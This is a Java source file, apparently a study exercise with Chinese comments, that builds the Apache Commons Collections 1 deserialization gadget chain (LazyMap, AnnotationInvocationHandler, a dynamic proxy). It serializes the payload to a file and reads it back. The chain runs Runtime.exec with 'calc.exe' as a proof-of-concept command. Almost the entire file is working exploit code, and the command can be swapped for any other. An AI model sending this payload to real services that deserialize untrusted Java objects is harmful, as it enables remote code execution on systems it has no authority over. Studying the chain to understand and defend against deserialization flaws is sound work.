import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1LazyMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //new ConstantTransformer(Runtime.class)原因：
                //Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。
                //将 Runtime.getRuntime() 换成了 Runtime.class，前者是java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。。Class类有实现Serializable接口，所以可以被序列化。
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        //将内部的多个Transformer串在⼀起
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //以上为递归调用

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        //实例化对象
        InvocationHandler annotationInvocationHandler = (InvocationHandler)construct.newInstance(Target.class, lazyMap);
        //动态代理（在invoke()方法中，调用memberValues的get()方法）
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);
        //动态代理后再实例化
        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);

        serialize(annotationInvocationHandler);
        unserialize();
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream( new FileOutputStream("cc1lazymap.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }
    public static void unserialize() throws  Exception{
        ObjectInputStream inputStream = new ObjectInputStream( new FileInputStream("cc1lazymap.bin"));
        Object obj = inputStream.readObject();




    }

}
